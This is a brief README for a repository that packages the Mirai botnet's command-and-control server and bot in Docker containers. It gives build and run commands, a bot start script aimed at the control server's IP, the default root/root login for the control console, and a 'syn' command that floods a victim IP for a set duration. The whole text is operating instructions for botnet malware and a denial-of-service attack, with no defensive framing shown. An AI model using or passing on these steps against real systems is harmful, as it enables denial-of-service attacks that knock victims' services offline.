# mirai-docker

## CNC
Build: `$ sudo docker build -t cnc .`
Run: `$ sudo docker run -i -t cnc`

## BOT
Build: `$ sudo docker build -t bot .`
Run: `$ sudo docker run -i -t bot`
Start Bot: `$ init.sh "IP of CNC" `

## Attack Instructions
Connect to CNC: `$ telnet "IP of CNC"`
username: root
password: root
attack: `$ syn "IP of Victim" "duration of attack"`
